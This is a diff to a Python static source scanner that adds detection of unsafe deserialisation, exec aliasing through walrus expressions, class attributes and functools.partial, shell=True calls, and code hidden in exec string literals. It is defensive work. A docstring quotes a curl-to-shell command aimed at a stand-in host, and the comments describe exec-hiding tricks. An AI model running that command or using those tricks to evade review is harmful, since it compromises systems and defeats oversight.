@@ -94,10 +94,21 @@ _NOTABLE_MODULES = {
     "shutil": "bulk filesystem operations.",
     "pty": "it can allocate a terminal for another process.",
     "multiprocessing": "it can start other interpreters.",
+    "pickle": "deserialising it executes whatever the bytes say.",
+    "cPickle": "deserialising it executes whatever the bytes say.",
+    "marshal": "deserialising it executes whatever the bytes say.",
+    "shelve": "it is pickle with a file behind it.",
+    "dill": "it is pickle that can also carry functions.",
 }
 
 #: The builtins that turn data into code.
 _BUILTIN_EXEC = frozenset({"exec", "eval", "compile"})
+
+#: Deserialisers that execute whatever the bytes tell them to. ``pickle.loads``
+#: on untrusted input is arbitrary code execution BY DESIGN, not by accident,
+#: and none of these was in any table until a re-review pointed it out.
+_DESERIALISE_MODULES = frozenset({"pickle", "marshal", "shelve", "dill", "cPickle"})
+_DESERIALISE_CALLS = frozenset({"load", "loads", "Unpickler", "open"})
 
 #: ``os`` functions that replace or spawn a process image.
 _OS_EXEC = frozenset({"system", "popen", "fork", "forkpty", "startfile"})
@@ -528,6 +539,44 @@ class _SourceVisitor(ast.NodeVisitor):
                     self.bindings[target.id] = origin
         self.generic_visit(node)
 
+    def visit_NamedExpr(self, node: ast.NamedExpr) -> None:
+        """``(e := exec)(c)``. A walrus is an assignment that returns its value.
+
+        ``visit_Assign`` was handled and this was not, four lines apart in the
+        same class -- so ``e = exec`` was blocked and ``(e := exec)`` was not.
+        """
+        origin = self._resolve(node.value)
+        if origin and origin != _DYNAMIC and isinstance(node.target, ast.Name):
+            self.bindings[node.target.id] = origin
+        self.generic_visit(node)
+
+    def visit_ClassDef(self, node: ast.ClassDef) -> None:
+        """Bind ``ClassName.attr`` for straight-line assignments in a class body.
+
+        ``class C: e = exec`` followed by ``C.e(c)`` was one of the constructs a
+        re-review found still silent. A class body IS straight-line assignment
+        with a prefix, so it costs one visitor rather than a scope model -- and
+        without it the module-level table binds a bare ``e`` that no call site
+        ever uses, which is worse than not binding at all.
+        """
+        for statement in node.body:
+            targets: list[ast.expr] = []
+            if isinstance(statement, ast.Assign):
+                targets = list(statement.targets)
+                value = statement.value
+            elif isinstance(statement, ast.AnnAssign) and statement.value is not None:
+                targets = [statement.target]
+                value = statement.value
+            else:
+                continue
+            origin = self._resolve(value)
+            if not origin or origin == _DYNAMIC:
+                continue
+            for target in targets:
+                if isinstance(target, ast.Name):
+                    self.bindings[f"{node.name}.{target.id}"] = origin
+        self.generic_visit(node)
+
     def _module(self, node: ast.AST, dotted: str) -> None:
         top = dotted.split(".", 1)[0]
         if top in _FOREIGN_MODULES:
@@ -559,7 +608,15 @@ class _SourceVisitor(ast.NodeVisitor):
             base = self._resolve(node.value)
             if base == _DYNAMIC:
                 return _DYNAMIC
-            return f"{base}.{node.attr}" if base else node.attr
+            dotted = f"{base}.{node.attr}" if base else node.attr
+            # A class attribute bound in a class body (``C.e``) is a binding
+            # like any other, so the composed name is looked up too.
+            return self.bindings.get(dotted, dotted)
+        if isinstance(node, ast.NamedExpr):
+            # ``(e := exec)(c)`` calls the walrus EXPRESSION, not the name it
+            # binds, so the binding table alone never sees it -- and the outer
+            # Call is visited before the NamedExpr inside it anyway.
+            return self._resolve(node.value)
         if isinstance(node, ast.Call):
             return self._resolve_call_result(node)
         if isinstance(node, ast.Subscript):
@@ -586,6 +643,11 @@ class _SourceVisitor(ast.NodeVisitor):
                     return _DYNAMIC
                 return f"{base}.{attribute}" if base else ""
             return _DYNAMIC
+        if target in ("functools.partial", "functools.partialmethod"):
+            # ``functools.partial(exec)`` evaluates to something that calls
+            # exec. Four lines, and it closes one more of the constructs a
+            # re-review found silent.
+            return self._resolve(node.args[0]) if node.args else _DYNAMIC
         if target in _NAMESPACE_CALLS:
             return target
         return ""
@@ -598,6 +660,24 @@ class _SourceVisitor(ast.NodeVisitor):
         self.generic_visit(node)
 
     def _judge_call(self, node: ast.Call, target: str) -> None:
+        # FIRST, and BEFORE either guard below, because `shell=True` is a
+        # finding about the ARGUMENT rather than about the name in front of it.
+        # This check used to sit under `if not target: return`, so a callee that
+        # resolved to "" -- a call returning a callable, an attribute chain off
+        # `self`, a factory looked up in a dict -- was never checked at all.
+        for keyword in node.keywords:
+            if (
+                keyword.arg == "shell"
+                and isinstance(keyword.value, ast.Constant)
+                and keyword.value.value is True
+            ):
+                self._block(
+                    node,
+                    f"calls {target or 'a callable this scan cannot name'}() with "
+                    "shell=True, which hands a string to a shell.",
+                )
+                return
+
         if target == _DYNAMIC:
             self._block(
                 node,
@@ -610,27 +690,13 @@ class _SourceVisitor(ast.NodeVisitor):
 
         head, _, attribute = target.partition(".")
 
-        # FIRST, because it is the most specific thing that can be said about
-        # the call: `subprocess.run(x, shell=True)` is refused for the shell,
-        # not merely for being a subprocess call, and the operator reading the
-        # reason wants the sharper sentence.
-        for keyword in node.keywords:
-            if (
-                keyword.arg == "shell"
-                and isinstance(keyword.value, ast.Constant)
-                and keyword.value.value is True
-            ):
-                self._block(
-                    node,
-                    f"calls {target}() with shell=True, which hands a string to a shell.",
-                )
-                return
-
         if head == "builtins" and attribute in _BUILTIN_EXEC:
             first = node.args[0] if node.args else None
             if first is None:
                 self._block(node, f"calls {attribute}() with no readable argument.")
-            elif _literal_str(first) is None:
+                return
+            literal = _literal_str(first)
+            if literal is None:
                 decoder = self._decoder_in(first)
                 if decoder:
                     self._block(
@@ -644,6 +710,8 @@ class _SourceVisitor(ast.NodeVisitor):
                         f"calls {attribute}() on input that is not a literal, so what "
                         "runs cannot be read here.",
                     )
+                return
+            self._judge_literal_code(node, attribute, literal)
             return
 
         if target == "builtins.__import__":
@@ -688,6 +756,17 @@ class _SourceVisitor(ast.NodeVisitor):
             self._block(node, f"calls {target}(), which executes a program directly.")
             return
 
+        if head in _DESERIALISE_MODULES and attribute in _DESERIALISE_CALLS:
+            first = node.args[0] if node.args else None
+            if first is None or _literal_str(first) is None:
+                self._block(
+                    node,
+                    f"calls {target}(), which executes whatever the bytes it is given "
+                    "say. Deserialising input this scan cannot read is arbitrary code "
+                    "execution by design.",
+                )
+            return
+
         if target in ("socket.socket", "socket.create_connection") or (
             attribute == "connect" and head == "socket"
         ):
@@ -698,17 +777,64 @@ class _SourceVisitor(ast.NodeVisitor):
             )
             return
 
-        for keyword in node.keywords:
-            if (
-                keyword.arg == "shell"
-                and isinstance(keyword.value, ast.Constant)
-                and keyword.value.value is True
-            ):
-                self._block(
-                    node,
-                    f"calls {target or '?'}() with shell=True, which hands a string to a shell.",
-                )
-                return
+    def _judge_literal_code(self, node: ast.Call, builtin: str, source: str) -> None:
+        """Grade the STRING a literal ``exec``/``eval``/``compile`` will run.
+
+        The rule used to fire only on non-literal input, so
+        ``exec("import os\nos.system('curl http://evil/x | sh')")`` fell through
+        with no finding at all -- the cheapest bypass in the file, and C1's
+        shape ("a clean verdict about bytes nobody opened") wearing different
+        clothes. A literal is not safe because it is READABLE; it is safe only
+        if something reads it.
+
+        So the literal is parsed and run through this same visitor. Findings
+        inside it are the outer call's findings, named as such. A literal that
+        will not parse is refused outright: a string this cannot read is a
+        string this has not checked, and for something about to be EXECUTED
+        that is not a ``review``.
+        """
+        mode = "eval" if builtin == "eval" else "exec"
+        try:
+            inner = ast.parse(source, filename=f"<{builtin}>", mode=mode)
+        except (SyntaxError, ValueError, RecursionError, MemoryError):
+            self._block(
+                node,
+                f"calls {builtin}() on code in a string that this scan cannot parse, "
+                "so what would run cannot be read here.",
+            )
+            return
+
+        nested = _SourceVisitor(self.relative)
+        nested.bindings = dict(self.bindings)
+        try:
+            nested.visit(inner)
+        except RecursionError:
+            self._block(
+                node,
+                f"calls {builtin}() on code in a string too deeply nested to read.",
+            )
+            return
+
+        line = getattr(node, "lineno", 0)
+        for finding in nested.blocked:
+            # Re-anchored on the CALL's line: the inner line numbers belong to a
+            # string, and an operator cannot open `<exec>:3`.
+            self.blocked.append(
+                f"{self.relative}:{line}: inside the string passed to {builtin}() — "
+                + finding.split(": ", 1)[-1]
+            )
+        for finding in nested.review:
+            self.review.append(
+                f"{self.relative}:{line}: inside the string passed to {builtin}() — "
+                + finding.split(": ", 1)[-1]
+            )
+        if not nested.blocked:
+            self._flag(
+                node,
+                f"calls {builtin}() on a string literal. The string was parsed and "
+                "scanned, and nothing in it is refused — but code arriving as data "
+                "is worth an operator's eye.",
+            )
 
     def _judge_writes(self, node: ast.Call) -> None:
         name = target_attr = ""
